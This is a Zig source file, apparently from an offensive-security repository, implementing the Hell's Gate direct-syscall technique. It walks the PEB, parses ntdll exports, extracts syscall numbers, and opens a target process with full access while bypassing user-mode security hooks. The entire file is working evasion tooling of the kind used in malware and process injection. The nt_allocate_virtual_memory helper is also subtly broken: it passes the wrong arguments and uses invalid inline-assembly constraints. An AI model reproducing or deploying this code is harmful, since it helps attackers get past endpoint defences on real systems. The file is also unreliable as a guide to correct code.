// Zig Hell's Gate implementation - Direct syscall
// This implementation is based on the original Rust implementation by ___ and C code by VX-UNDERGROUND
// Author : @zux0x3a
// https://github.com/0xsp-SRD/zig_offsec/Hells_Gate/

const std = @import("std");
const os = std.os;
const win32 = os.windows;

const IMAGE_NT_HEADERS64 = extern struct {
    signature: u32,
    file_header: IMAGE_FILE_HEADER,
    optional_header: IMAGE_OPTIONAL_HEADER64,
};

const IMAGE_OPTIONAL_HEADER64 = extern struct {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    image_base: u64, // 64-bit in PE64
    section_alignment: u32,
    file_alignment: u32,
    major_operating_system_version: u16,
    minor_operating_system_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    check_sum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64, // 64-bit
    size_of_stack_commit: u64, // 64-bit
    size_of_heap_reserve: u64, // 64-bit
    size_of_heap_commit: u64, // 64-bit
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [16]IMAGE_DATA_DIRECTORY,
};
// Windows API structures
const IMAGE_DOS_HEADER = extern struct {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [4]u16,
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [10]u16,
    e_lfanew: u32,
};

const IMAGE_NT_HEADERS = extern struct {
    signature: u32,
    file_header: IMAGE_FILE_HEADER,
    optional_header: IMAGE_OPTIONAL_HEADER,
};

const IMAGE_FILE_HEADER = extern struct {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
};
const PROCESS_ALL_ACCESS = 0x001F0FFF;
const IMAGE_DOS_SIGNATURE = 0x5A4D; // "MZ"
const IMAGE_NT_SIGNATURE = 0x00004550; // "PE\0\0"
const IMAGE_OPTIONAL_HEADER = extern struct {
    magic: u16,
    major_linker_version: u8,
    minor_linker_version: u8,
    size_of_code: u32,
    size_of_initialized_data: u32,
    size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    base_of_code: u32,
    base_of_data: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    major_operating_system_version: u16,
    minor_operating_system_version: u16,
    major_image_version: u16,
    minor_image_version: u16,
    major_subsystem_version: u16,
    minor_subsystem_version: u16,
    win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    check_sum: u32,
    subsystem: u16,
    dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [16]IMAGE_DATA_DIRECTORY,
};
const IMAGE_DATA_DIRECTORY = extern struct {
    virtual_address: u32,
    size: u32,
};

const IMAGE_EXPORT_DIRECTORY = extern struct {
    characteristics: u32,
    time_date_stamp: u32,
    major_version: u16,
    minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
};

const UNICODE_STRING = extern struct {
    length: u16,
    maximum_length: u16,
    buffer: *u16,
};
const LDR_DATA_TABLE_ENTRY = extern struct {
    in_load_order_links: [2]usize,
    in_memory_order_links: [2]usize,
    in_initialization_order_links: [2]usize,
    dll_base: *anyopaque,
    entry_point: *anyopaque,
    size_of_image: u32,
    full_dll_name: UNICODE_STRING,
    base_dll_name: UNICODE_STRING,
    flags: u32,
    load_count: u16,
    tls_index: u16,
    hash_links: [2]usize,
    time_date_stamp: u32,
    entry_point_activated: u8,
    load_reason: u8,
};

const OBJECT_ATTRIBUTES = extern struct {
    length: u32,
    root_directory: ?win32.HANDLE,
    object_name: ?*const UNICODE_STRING,
    attributes: u32,
    security_descriptor: ?*const anyopaque,
    security_quality_of_service: ?*const anyopaque,
};

const CLIENT_ID = extern struct {
    unique_process: *anyopaque,
    unique_thread: ?*anyopaque,
};

fn load_peb_info() struct { peb: usize, ldr: usize, modules_list: usize } {
    var peb: usize = undefined;
    var ldr: usize = undefined;
    var modules_list: usize = undefined;

    asm volatile (
        \\ movq %%gs:0x60, %[peb]
        \\ movq 0x18(%[peb]), %[ldr]
        \\ movq 0x10(%[ldr]), %[modules_list]
        : [peb] "=r" (peb),
          [ldr] "=r" (ldr),
          [modules_list] "=r" (modules_list),
        :
        : .{ .memory = true });

    return .{ .peb = peb, .ldr = ldr, .modules_list = modules_list };
}
// Get the base address of a module
pub fn get_module_base(module_name: []const u8) ?*anyopaque {
    const info = load_peb_info();
    var current_entry = info.modules_list;

    std.debug.print("[+] Found PEB and InMemoryOrderModuleList: 0x{x}\n", .{info.modules_list});
    std.debug.print("[i] Searching for module: {s}\n", .{module_name});

    current_entry = info.modules_list;

    while (true) {
        if (current_entry == 0) break;

        const dll_base_name = @as(*usize, @ptrFromInt(current_entry + 0x30)).*;
        const module_name_address = @as(*usize, @ptrFromInt(current_entry + 0x60)).*;
        const module_length = @as(*u16, @ptrFromInt(current_entry + 0x58)).*;

        if (module_name_address != 0 and module_length > 0) {
            const module_name_ptr = @as([*]u16, @ptrFromInt(module_name_address));
            const module_name_len = module_length / 2;
            const module_name_slice = module_name_ptr[0..@intCast(module_name_len)];

            // lets convert to ASCII for comparsion
            var ascii_name: [256]u8 = undefined;
            const max_len = @min(module_name_slice.len, ascii_name.len);
            for (module_name_slice[0..max_len], 0..) |wchar, i| {
                //  ascii_name[i] = @as(u16, char & 0xFF);
                ascii_name[i] = @truncate(wchar);
            }
            const ascii_name_slice = ascii_name[0..max_len];
            //  const ascii_name_slice = ascii_name[0 .. std.mem.indexOfScalar(u8, &ascii_name, 0) orelse ascii_name.len];
            std.debug.print("[+] Found module: 0x{x} {s}\n", .{ dll_base_name, ascii_name_slice });

            if (std.mem.eql(u8, ascii_name_slice, module_name)) {
                std.debug.print("[+] Found target module: 0x{x}\n", .{dll_base_name});
                return @ptrFromInt(dll_base_name);
            }
        }
        current_entry = @as(*usize, @ptrFromInt(current_entry)).*;
        //current_entry = entry.in_memory_order_links[0];
        if (current_entry == info.modules_list) break;
    }

    std.debug.print("[!] Module not found\n", .{});
    return null;
}

pub fn get_ntdll_base(module_name: []const u8) ?*anyopaque {
    const peb = win32.peb();
    var list_entry = peb.Ldr.InMemoryOrderModuleList.Flink;

    while (true) {
        const module: *const win32.LDR_DATA_TABLE_ENTRY = @fieldParentPtr("InMemoryOrderLinks", list_entry);

        if (module.BaseDllName.Buffer) |buffer| {
            var dll_name: [256]u8 = undefined;
            var i: usize = 0;

            while (i < module.BaseDllName.Length / @sizeOf(win32.WCHAR) and i < 255) {
                dll_name[i] = @truncate(buffer[i]);
                i += 1;
            }

            dll_name[i] = 0;

            if (std.ascii.eqlIgnoreCase(dll_name[0..i], module_name)) {
                return module.DllBase;
            }
        }

        list_entry = list_entry.Flink;

        if (list_entry == &peb.Ldr.InMemoryOrderModuleList) break;
    }

    return null;
}
pub fn get_function_address_from_export(dll_name: []const u8, function_name: []const u8) ?*anyopaque {
    // const dll_base = get_module_base((dll_name));   // if you want the RAW inline_ASM version.
    const dll_base = get_ntdll_base(dll_name);

    const base_addr = @intFromPtr(dll_base);
    std.debug.print("[DEBUG] DLL base for {s}: 0x{x}\n", .{ dll_name, base_addr });

    const dos_header = @as(*const IMAGE_DOS_HEADER, @ptrFromInt(base_addr));
    if (dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
        std.debug.print("[!] Invalid DOS header\n", .{});
        return null;
    }
    //     const nt_header = @as(*const IMAGE_NT_HEADERS, @ptrFromInt(@intFromPtr(module_base) + @as(usize, @as(u32, @intCast(dos_header.e_lfanew)))));
    std.debug.print("[DEBUG] DOS header valid, e_lfanew: 0x{x}\n", .{dos_header.e_lfanew});

    const nt_header = @as(*const IMAGE_NT_HEADERS64, @ptrFromInt((base_addr + dos_header.e_lfanew)));
    if (nt_header.signature != IMAGE_NT_SIGNATURE) {
        std.debug.print("[!] Invalid NT header\n", .{});
        return null;
    }

    const export_dir_rva = nt_header.optional_header.data_directory[0].virtual_address;

    if (export_dir_rva == 0) {
        std.debug.print("[-] Export dir RVA is 0\n", .{});
        return null;
    }
    if (export_dir_rva >= nt_header.optional_header.size_of_image) {
        std.debug.print("[-] Export dir RVA 0x{x} exceeds image size 0x{x}\n", .{ export_dir_rva, nt_header.optional_header.size_of_image });
        return null;
    }
    std.debug.print("[DEBUG] Export dir RVA: 0x{x}\n", .{export_dir_rva});

    if (export_dir_rva > std.math.maxInt(usize) - base_addr) {
        std.debug.print("[-] Export dir RVA overflow\n", .{});
        return null;
    }

    const export_dir = @as(*const IMAGE_EXPORT_DIRECTORY, @ptrFromInt(base_addr + export_dir_rva)).*;

    //    const export_dir = @as(*const IMAGE_EXPORT_DIRECTORY, @ptrFromInt(nt_header.optional_header.data_directory[0].virtual_address));

    //const export_dir = @ptrFromInt(*IMAGE_EXPORT_DIRECTORY, @ptrFromInt(base_addr) + nt_header.optional_header.data_directory[0].virtual_address);
    //    let names = unsafe { dll_base.add(address_of_names_rva as usize) } as *const u32;

    // Calculate export dir address with overflow check
    if (export_dir_rva > std.math.maxInt(usize) - base_addr) {
        std.debug.print("[-] Export dir RVA overflow\n", .{});
        return null;
    }
    const export_dir_ptr = @as(?*const IMAGE_EXPORT_DIRECTORY, @ptrFromInt(base_addr + export_dir_rva));
    if (export_dir_ptr == null) {
        std.debug.print("[-] Null export dir pointer\n", .{});
        return null;
    }
    // const export_dir = export_dir_ptr.*;
    std.debug.print("[DEBUG] Export dir loaded, number_of_names: {}\n", .{export_dir.number_of_names});

    const name_address = @as(?[*]u32, @ptrFromInt((base_addr + export_dir.address_of_names)));
    const name_ordinals = @as(?[*]u16, @ptrFromInt((base_addr + export_dir.address_of_name_ordinals)));
    const function_addresses = @as(?[*]u32, @ptrFromInt(base_addr + export_dir.address_of_functions));
    if (name_address == null or name_ordinals == null or function_addresses == null) {
        std.debug.print("[-] Null export array pointer\n", .{});
        return null;
    }

    // for i in 0..number_of_names
    std.debug.print("[+] Export directory: {}\n", .{export_dir.number_of_names});
    for (0..export_dir.number_of_names) |i| {
        const name_rva = name_address.?[i];
        const name_ptr = @as(?[*]u8, @ptrFromInt((base_addr + name_rva)));
        if (name_ptr == null) continue;
        // Find name length safely
        var name_len: usize = 0;
        while (name_len < 256 and name_ptr.?[name_len] != 0) : (name_len += 1) {} // Cap at 256 to prevent infinite loop
        const name_slice = name_ptr.?[0..name_len];

        if (std.mem.eql(u8, name_slice, function_name)) {
            const ordinal = name_ordinals.?[i];
            if (ordinal >= export_dir.number_of_functions) {
                std.debug.print("[-] Invalid ordinal: {}\n", .{ordinal});
                continue;
            }
            const function_rva = function_addresses.?[ordinal];
            const function_addr = @as(*anyopaque, @ptrFromInt((base_addr + function_rva)));
            std.debug.print("[+] Found function: {s} at 0x{x}\n", .{ function_name, @intFromPtr(function_addr) });
            return function_addr;
        }
    }
    std.debug.print("[!] Function not found: {s}\n", .{function_name});
    return null;
}

pub fn get_ssn(dll_name: []const u8, function_name: []const u8) ?u32 {
    // std.debug.print("[+] Getting SSN for {s} {s}\n", .{ dll_name, function_name });
    const function_addr = get_function_address_from_export(dll_name, function_name) orelse return null;
    std.debug.print("[+] Function address: 0x{x}\n", .{@intFromPtr(function_addr)});
    const addr = @intFromPtr(function_addr);

    // Read bytes 4 and 5 to get syscall number
    const byte4 = @as(*const u8, @ptrFromInt(addr + 4)).*;
    const byte5 = @as(*const u8, @ptrFromInt(addr + 5)).*;

    // Combine bytes into syscall number
    const ssn = (@as(u32, byte5) << 8) | @as(u32, byte4);
    std.debug.print("[+] Extracted SSN: {}\n", .{ssn});
    return ssn;
}

fn nt_open_process(
    process_handle: *win32.HANDLE,
    desired_access: u32,
    object_attributes: *OBJECT_ATTRIBUTES,
    client_id: *CLIENT_ID,
    ssn: u32,
) u32 {
    var status: u32 = 0;

    asm volatile (
        \\ movq %%rcx, %%r10
        \\ movl %[ssn], %%eax
        \\ syscall
        : [status] "={rax}" (status),
        : [ssn] "r" (ssn),
          [process_handle] "{rcx}" (process_handle),
          [desired_access] "{rdx}" (desired_access),
          [object_attributes] "{r8}" (object_attributes),
          [client_id] "{r9}" (client_id),
        : .{ .r10 = true, .memory = true });
    return status;
}

// Example syscall function (NtAllocateVirtualMemory)
pub fn nt_allocate_virtual_memory(
    process_handle: win32.HANDLE,
    base_address: *?*anyopaque,
    zero_bits: usize,
    region_size: *usize,
    allocation_type: u32,
    protect: u32,
) u32 {
    const ssn = get_ssn(get_function_address_from_export(get_module_base("ntdll.dll").?, "NtAllocateVirtualMemory").?) orelse return 0xC0000001; // STATUS_UNSUCCESSFUL

    // Direct syscall implementation
    return asm volatile (
        \\ mov %[ssn], %eax
        \\ mov %rcx, %r10
        \\ syscall
        \\ ret
        : [ret] "={rax}" (-> u32),
        : [ssn] "i" (ssn),
          [process_handle] "{rcx}" (process_handle),
          [base_address] "{rdx}" (base_address),
          [zero_bits] "{r8}" (zero_bits),
          [region_size] "{r9}" (region_size),
          [allocation_type] "{rsp+0x28}" (allocation_type),
          [protect] "{rsp+0x30}" (protect),
        : .{ .r10 = true, .memory = true });
}

pub fn parse_args(allocator: std.mem.Allocator) u32 {
    var args = std.process.argsWithAllocator(allocator) catch {
        std.debug.print("[-] Failed to get command line arguments\n", .{});
        std.process.exit(1);
    };
    defer args.deinit();

    _ = args.next(); // Skip program name

    if (args.next()) |pid_str| {
        return std.fmt.parseInt(u32, pid_str, 10) catch {
            std.debug.print("[-] Invalid PID format\n", .{});
            std.process.exit(1);
        };
    } else {
        std.debug.print("[-] Usage: program_name <pid>\n", .{});
        std.process.exit(1);
    }
    // return 0;
}
fn waitForEnter() !void {
    std.debug.print("Press Enter to continue...\n", .{});

    const stdin = std.fs.File.stdin();
    var buf: [1]u8 = undefined;

    // Read until newline
    while (true) {
        const n = try stdin.read(&buf);
        if (n == 0) break; // EOF
        if (buf[0] == '\n') break; // Enter pressed
    }
}
pub fn main() void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    // Get PID from command line
    const pid = parse_args(allocator);

    // const pid = 9056;
    std.debug.print("[+] Target PID: {}\n", .{pid});
    _ = waitForEnter() catch {}; // remove if if you do not want to debug.

    const ntdll_str = "ntdll.dll";
    const nt_open_proc_str = "NtOpenProcess";
    // Get syscall number using Hell's Gate
    const ssn = get_ssn(ntdll_str, nt_open_proc_str) orelse {
        std.debug.print("[-] Failed to get SSN\n", .{});
        return;
    };

    // Prepare structures for NtOpenProcess
    var process_handle: ?win32.HANDLE = undefined;
    const desired_access = PROCESS_ALL_ACCESS;

    var object_attributes = OBJECT_ATTRIBUTES{
        .length = @sizeOf(OBJECT_ATTRIBUTES),
        .root_directory = null,
        .object_name = null,
        .attributes = 0,
        .security_descriptor = null,
        .security_quality_of_service = null,
    };

    var client_id = CLIENT_ID{
        .unique_process = @ptrFromInt(pid),
        .unique_thread = null,
    };

    // Make the syscall
    const status = nt_open_process(
        &process_handle.?,
        desired_access,
        &object_attributes,
        &client_id,
        ssn,
    );

    if (status == 0) {
        std.debug.print("[+] Successfully opened process. Handle: 0x{x}\n", .{@intFromPtr(process_handle.?)});
    } else {
        std.debug.print("[-] Failed to open process. NTSTATUS: 0x{x}\n", .{status});
    }
}
